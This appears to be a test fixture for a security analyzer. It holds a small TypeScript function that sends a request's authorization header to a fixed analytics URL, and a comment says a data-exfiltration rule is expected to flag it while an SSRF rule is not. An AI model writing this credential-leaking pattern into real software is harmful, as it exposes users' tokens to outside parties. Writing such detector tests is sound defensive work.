// DATA_EXFIL: a request header (Sensitive-tier source) flows into the
// body of fetch() via the body field of the init object. Destination is
// a static literal so SSRF must not fire.
function leakHeader(req: { headers: { authorization: string } }): void {
    const auth = req.headers.authorization;
    fetch('https://analytics.internal/track', {
        method: 'POST',
        body: auth,
    });
}
